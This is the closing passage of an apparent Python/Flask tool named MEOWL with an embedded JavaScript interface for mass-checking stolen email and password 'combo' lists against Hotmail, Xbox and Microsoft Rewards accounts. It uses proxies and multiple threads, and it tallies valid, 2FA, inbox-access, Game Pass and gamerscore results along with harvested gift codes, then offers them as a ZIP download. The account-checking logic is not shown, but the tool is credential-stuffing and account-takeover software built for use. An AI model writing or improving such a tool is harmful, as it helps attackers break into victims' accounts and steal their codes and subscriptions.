  return [...state.keywords, ...custom];
}

document.getElementById('test-btn').addEventListener('click', async () => {
  const first = accTa.value.split('\n').map(l => l.trim()).filter(Boolean)[0];
  if (!first) { alert('No accounts'); return; }
  const box = document.getElementById('diag-panel');
  box.classList.remove('hidden');
  const out = document.getElementById('diag-box');
  out.textContent = 'testing…';
  try {
    const r = await fetch('/api/test', {method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({combo: first, checker_type: state.checkerType,
                            proxies: getProxies()})});
    const d = await r.json();
    let html = '<div><span class="k">status </span><span class="v">' + esc(d.status || '?') + '</span></div>';
    html += '<div><span class="k">combo  </span><span class="v">' + esc(d.email || '?') + '</span></div>';
    html += '<div><span class="k">proxied</span><span class="v"> ' + (d.proxied ? 'yes' : 'no') + '</span></div>';
    if (d.error) html += '<div><span class="err">' + esc(d.error) + '</span></div>';
    const diag = d.diag || {};
    for (const [k, v] of Object.entries(diag)) {
      const vs = typeof v === 'string' ? v : JSON.stringify(v);
      html += '<div><span class="k">' + esc(k) + ' </span><span class="v">' + esc(vs) + '</span></div>';
    }
    if (d.gamerscore !== undefined) html += '<div><span class="k">gamerscore </span><span class="v">' + d.gamerscore + '</span></div>';
    if (d.gamertag)   html += '<div><span class="k">gamertag   </span><span class="v">' + esc(d.gamertag) + '</span></div>';
    if (d.gamepass)   html += '<div><span class="k">gamepass   </span><span class="v">' + esc(d.gamepass) + '</span></div>';
    if (d.codes && d.codes.length) html += '<div><span class="k">codes </span><span class="v">' + esc(d.codes.join(', ')) + '</span></div>';
    out.innerHTML = html;
  } catch (e) {
    out.innerHTML = '<div class="err">request failed: ' + esc(e.message) + '</div>';
  }
});

function esc(s){
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

document.getElementById('start-btn').addEventListener('click', async () => {
  const raw = accTa.value.split('\n').map(l => l.trim()).filter(Boolean);
  if (!raw.length) { alert('No accounts'); return; }
  const body = {
    accounts: raw,
    checker_type: state.checkerType,
    keywords: getKeywords(),
    proxies: getProxies(),
    threads: parseInt(threadsSlider.value, 10),
    filename: 'meowl_run',
  };
  document.getElementById('start-btn').disabled = true;
  try {
    const r = await fetch('/api/start', {method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(body)});
    const d = await r.json();
    if (!r.ok) { alert('Error: ' + (d.error || r.status)); document.getElementById('start-btn').disabled = false; return; }
    state.sessionId = d.session_id;
    state.modalShown = false;
    showLive();
  } catch (e) {
    alert('Network error: ' + e.message);
    document.getElementById('start-btn').disabled = false;
  }
});

document.getElementById('stop-btn').addEventListener('click', async () => {
  if (!state.sessionId) return;
  document.getElementById('stop-btn').disabled = true;
  await fetch('/api/stop/' + state.sessionId, {method: 'POST'});
});

document.getElementById('menu-btn').addEventListener('click', showSetup);

document.getElementById('download-btn').addEventListener('click', () => {
  if (!state.sessionId) return;
  downloadZip(state.sessionId);
});

document.getElementById('last-download-btn').addEventListener('click', () => {
  if (!state.sessionId) return;
  downloadZip(state.sessionId);
});

document.getElementById('last-view-btn').addEventListener('click', showLive);

document.getElementById('last-resume-btn').addEventListener('click', async () => {
  if (!state.sessionId) return;
  document.getElementById('last-resume-btn').disabled = true;
  await fetch('/api/resume/' + state.sessionId, {method: 'POST'});
  showLive();
});

function downloadZip(sid) {
    const a = document.createElement('a');
    a.href = '/api/download/' + sid;
    a.download = 'results.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

function showSetup() {
  document.getElementById('live').classList.add('hidden');
  document.getElementById('setup').classList.remove('hidden');
  document.getElementById('start-btn').disabled = false;
  
  if (state.sessionId) {
    const pill = document.getElementById('last-results-pill');
    pill.classList.remove('hidden');
    document.getElementById('last-sid').textContent = '#' + state.sessionId;
    document.getElementById('last-download-btn').classList.remove('hidden');
    
    fetch('/api/status/' + state.sessionId).then(r => r.json()).then(s => {
      const info = document.getElementById('last-results-info');
      const resumeBtn = document.getElementById('last-resume-btn');
      const viewBtn = document.getElementById('last-view-btn');
      
      if (s.running) {
        info.innerHTML = 'Session running in background <span class="sid">#' + state.sessionId + '</span>';
        viewBtn.classList.remove('hidden');
        resumeBtn.classList.add('hidden');
      } else if (s.stopped) {
        info.innerHTML = 'Stopped at <b>' + s.checked + '/' + s.total + '</b> <span class="sid">#' + state.sessionId + '</span>';
        viewBtn.classList.add('hidden');
        resumeBtn.classList.remove('hidden');
        resumeBtn.disabled = false;
      } else {
        info.innerHTML = 'Completed <b>' + s.checked + '/' + s.total + '</b> <span class="sid">#' + state.sessionId + '</span>';
        viewBtn.classList.add('hidden');
        resumeBtn.classList.add('hidden');
      }
    });
  }
}

function showLive() {
  document.getElementById('setup').classList.add('hidden');
  document.getElementById('live').classList.remove('hidden');
  document.getElementById('stop-btn').disabled = false;
  if (state.polling) clearInterval(state.polling);
  state.polling = setInterval(poll, 1200);
  poll();
}

async function poll() {
  if (!state.sessionId) return;
  try {
    const [sRes, hRes] = await Promise.all([
      fetch('/api/status/' + state.sessionId),
      fetch('/api/hits/' + state.sessionId)]);
    if (!sRes.ok) return;
    const stats = await sRes.json();
    const hits = await hRes.json();
    renderStats(stats);
    renderHits(hits);
    
    if (stats.proxy_depleted && !state.modalShown) {
      state.modalShown = true;
      document.getElementById('proxy-modal').classList.remove('hidden');
    }
    
    if (stats.completed || stats.stopped) {
      clearInterval(state.polling);
      state.polling = null;
      document.getElementById('stop-btn').disabled = true;
      document.getElementById('status-dot').className = 'dot ' + (stats.stopped ? 'stopped' : 'done');
      document.getElementById('status-text').textContent = stats.stopped ? 'Stopped' : 'Complete';
      document.getElementById('proxy-modal').classList.add('hidden');
      
      if (!document.getElementById('live').classList.contains('hidden')) {
        setTimeout(showSetup, 1500);
      }
    }
  } catch (e) {}
}

function renderStats(s){
  const pct = s.percent || 0;
  document.getElementById('bar-fill').style.width = pct.toFixed(1) + '%';
  document.getElementById('bar-text').textContent =
    pct.toFixed(1) + '% · ' + s.checked + '/' + s.total + ' · ' + s.cpm + ' cpm';
  const t = s.checker_type;
  let html = '';
  const cell = (k, v, cls) => `<div class="stat ${cls||''}"><div class="k">${k}</div><div class="v">${v}</div></div>`;
  
  html += cell('Valid', s.valid, '');
  html += cell('Bad', s.bad, 'danger');
  html += cell('2FA', s.twofa, 'warn');
  html += cell('Errors', s.errors, 'danger');

  if (t === 'hotmail') {
    html += cell('Inbox', s.inbox, 'cyan');
    html += cell('Active', s.active, 'cyan');
  } else if (t === 'xbox') {
    html += cell('Premium', s.premium, '');
    html += cell('Free', s.free, 'cyan');
    html += cell('GamePass', s.gamepass, 'cyan');
    html += cell('GScore', s.gamerscore, '');
  } else if (t === 'codefetcher') {
    html += cell('Codes', s.codes_found, '');
    html += cell('Accts w/ Codes', s.accounts_with_codes, 'cyan');
  } else {
    html += cell('Hits', s.rewards_hits, '');
    html += cell('Points', s.rewards_points, '');
    html += cell('Zero', s.rewards_zero, 'warn');
  }
  
  if (s.proxied) {
    html += cell('Proxy Live', s.proxy_alive, 'cyan');
    html += cell('Proxy Dead', s.proxy_dead, 'danger');
  }
  
  html += cell('Elapsed', Math.floor(s.elapsed) + 's', 'cyan');
  html += cell('Threads', s.threads || '-', '');
  document.getElementById('stats-grid').innerHTML = html;
}

function renderHits(hits){
  const el = document.getElementById('hits');
  if (!hits.length) { el.innerHTML = '<div class="empty">waiting for hits…</div>'; return; }
  el.innerHTML = hits.slice().reverse().map(h => `
    <div class="hit">
      <span class="t">${h.time}</span>
      <span class="c ${h.color}">${h.category}</span>
      <span class="m">${esc(h.text)}</span>
    </div>`).join('');
}

// Modal Logic
document.getElementById('modal-yes').addEventListener('click', async () => {
  document.getElementById('proxy-modal').classList.add('hidden');
  await fetch('/api/proxy_switch', {
    method: 'POST', 
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({session_id: state.sessionId})
  });
});

document.getElementById('modal-no').addEventListener('click', async () => {
  document.getElementById('proxy-modal').classList.add('hidden');
  await fetch('/api/stop/' + state.sessionId, {method: 'POST'});
});

// Init
loadSettings();
</script>
</body>
</html>
"""

# ===== Main =====
def find_free_port(start=PORT_DEFAULT):
    for port in range(start, start + 30):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try: s.bind(('127.0.0.1', port)); return port
            except OSError: continue
    return start

def open_browser(url):
    time.sleep(1.5)
    try:
        import webbrowser
        webbrowser.open(url)
    except Exception:
        pass

if __name__ == '__main__':
    if os.environ.get("VERCEL"):
        # Vercel environment
        pass
    else:
        port = find_free_port(PORT_DEFAULT)
        url = f"http://127.0.0.1:{port}"
        print(f"[*] Starting MEOWL on {url}")
        threading.Thread(target=open_browser, args=(url,), daemon=True).start()
        try:
            app.run(host='0.0.0.0', port=port, threaded=True, debug=False, use_reloader=False)
        except Exception as e:
            print(f"[!] Server crashed: {e}")